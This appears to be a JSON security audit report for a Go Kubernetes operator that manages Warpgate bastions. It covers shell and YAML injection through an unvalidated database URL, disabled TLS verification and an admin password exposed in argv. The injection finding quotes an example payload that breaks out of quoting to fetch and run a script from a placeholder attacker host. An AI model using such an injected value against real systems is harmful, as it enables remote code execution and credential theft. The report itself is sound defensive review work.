@@ -1,0 +1,61 @@
+{
+  "summary": "Reviewed the warpgate-operator Go Kubernetes operator across cmd/, api/v1alpha1/ (types, webhooks, validators) and internal/ (controllers and the Warpgate REST client). The operator reconciles custom resources into Warpgate API calls and manages the Warpgate Deployment, secrets, TLS and connections. Overall risk is moderate: the most significant issues are an unvalidated WarpgateInstance.spec.DatabaseURL that is interpolated unescaped into both a shell init script (command injection) and the generated YAML config, and the operator permanently disabling TLS certificate verification on the connection it uses to send Warpgate admin credentials. Secret handling, password generation (crypto/rand), metrics auth, and HTTP/2 hardening are otherwise sound. Coverage was limited to the Go source in the requested scope; charts/, config/, test/ and the Containerfile were not assessed.",
+  "coverage": [
+    "cmd/main.go",
+    "internal/controller/helpers.go",
+    "internal/controller/warpgateinstance_controller.go",
+    "internal/controller/warpgateticket_controller.go",
+    "internal/controller/warpgatepasswordcredential_controller.go",
+    "internal/controller/warpgatetarget_controller.go",
+    "internal/controller/warpgateuser_controller.go",
+    "internal/warpgate/client.go",
+    "internal/warpgate/credentials.go",
+    "internal/warpgate/ssh_keys.go",
+    "internal/warpgate/target.go",
+    "internal/warpgate/user.go",
+    "internal/warpgate/parameters.go",
+    "api/v1alpha1/warpgateinstance_webhook.go",
+    "api/v1alpha1/warpgateconnection_webhook.go"
+  ],
+  "findings": [
+    {
+      "title": "Command/YAML injection via unvalidated WarpgateInstance.spec.DatabaseURL in init container script",
+      "category": "security",
+      "cwe": "CWE-78",
+      "severity": "medium",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 556,
+      "line_end": 558,
+      "description": "buildDeployment assembles a /bin/sh init script by string concatenation and interpolates inst.Spec.DatabaseURL directly into a shell command line via fmt.Sprintf(` --database-url \"%s\"`, ...). The whole script is later run as the init container Command []string{\"/bin/sh\", \"-c\", initScript} (lines 774-776). DatabaseURL is never validated: the webhook only emits an informational warning for it (api/v1alpha1/warpgateinstance_webhook.go:256-258). A principal with RBAC to create/update WarpgateInstance CRs can set DatabaseURL to e.g. 'sqlite:/data/db\"; wget http://attacker/x -O- | sh; \"' to break out of the quotes and execute arbitrary commands in the init container (which holds the ADMIN_PASSWORD env var). The same unescaped value is also written into the generated warpgate.yaml config (buildWarpgateConfig, line 345: `database_url: \"%s\"`), and inst.Spec.ExternalHost is interpolated unquoted into the YAML at line 380 \u2014 both allow YAML/config injection via embedded newlines. This is most dangerous where a policy layer (GitOps/admission) permits setting data fields like databaseURL but restricts spec.image / spec.configOverride, in which case the injection bypasses that restriction to gain arbitrary in-pod execution.",
+      "evidence": "setupCmd += fmt.Sprintf(` --database-url \"%s\"`, inst.Spec.DatabaseURL)  // line 557\n... initScript := strings.Join(scriptParts, \"\\n\")  // line 611\n... Command: []string{\"/bin/sh\", \"-c\", initScript}  // line 776\nValidator only warns: warnings = append(warnings, \"databaseURL is set ...\") (warpgateinstance_webhook.go:257). Same taint in buildWarpgateConfig: fmt.Fprintf(&b, \"database_url: \\\"%s\\\"\\n\", inst.Spec.DatabaseURL) (line 345) and fmt.Fprintf(&b, \"external_host: %s\\n\", inst.Spec.ExternalHost) (line 380).",
+      "recommendation": "Do not build the init command by concatenating untrusted strings into a shell line. Pass DatabaseURL to the warpgate binary via an environment variable (as done for ADMIN_PASSWORD) and reference it with proper quoting, or exec the binary directly without /bin/sh. Add strict webhook validation for DatabaseURL (e.g. require a known scheme like sqlite:/postgres:/mysql: and reject shell metacharacters, quotes and newlines) and for ExternalHost (RFC1123 hostname). For the YAML config, marshal via a real YAML encoder instead of fmt.Fprintf."
+    },
+    {
+      "title": "TLS certificate verification permanently disabled on operator-created WarpgateConnection carrying admin credentials",
+      "category": "security",
+      "cwe": "CWE-295",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 1109,
+      "line_end": 1113,
+      "description": "ensureWarpgateConnection auto-creates a WarpgateConnection with InsecureSkipVerify hardcoded to true and stores the Warpgate admin username/password in the referenced <inst>-admin-auth secret. getWarpgateClient (internal/controller/helpers.go:54-58, 81-86) propagates InsecureSkipVerify into the HTTP client's tls.Config (internal/warpgate/client.go:55-58), so every controller that uses this connection authenticates to the Warpgate instance over HTTPS without verifying the server certificate. The admin password is then POSTed to /@warpgate/api/auth/login (client.go:101-110). An attacker able to intercept traffic to the in-cluster service IP (e.g. a malicious pod performing ARP/DNS/service spoofing, or a compromised node) can transparently MITM the connection and capture full Warpgate admin credentials, yielding control of the bastion and all of its targets. The self-signed cert generated by the init container makes verification impossible without also wiring the generated CA into the client trust store.",
+      "evidence": "conn.Spec = warpgatev1alpha1.WarpgateConnectionSpec{\n    Host: host,\n    AuthSecretRef: warpgatev1alpha1.AuthSecretRef{Name: authSecretName},\n    InsecureSkipVerify: true, // self-signed cert within cluster\n}\n-> helpers.go passes InsecureSkipVerify to warpgate.NewClient -> client.go: transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}",
+      "recommendation": "Issue the instance certificate from a known CA (the operator already supports cert-manager) and configure the client with that CA via RootCAs instead of skipping verification. At minimum, when cert-manager/self-signed certs are used, pin the generated CA certificate and pass it to the client so the server identity is verified rather than disabling verification outright."
+    },
+    {
+      "title": "Warpgate admin password exposed via process arguments in init container",
+      "category": "security",
+      "cwe": "CWE-214",
+      "severity": "low",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 549,
+      "line_end": 552,
+      "description": "The unattended-setup command is built with --admin-password \"${ADMIN_PASSWORD}\". Although ADMIN_PASSWORD is injected as an env var, the shell expands it before exec, so the warpgate process receives the cleartext admin password in its argv, where it is readable via /proc/<pid>/cmdline and process listings by any other process sharing the init container (or by node-level access). This widens exposure of the Warpgate admin credential beyond the env/secret.",
+      "evidence": "setupCmd := fmt.Sprintf(`warpgate --skip-securing-files unattended-setup --data-path /data --http-port %d --admin-password \"${ADMIN_PASSWORD}\"`, instanceHTTPPort(inst))",
+      "recommendation": "Prefer a mechanism that reads the password from an env var or file directly in the warpgate binary rather than passing it on the command line. If the CLI must receive it, feed it via stdin or a file path argument (e.g. a mounted secret file) so the secret never appears in argv."
+    }
+  ]
+}
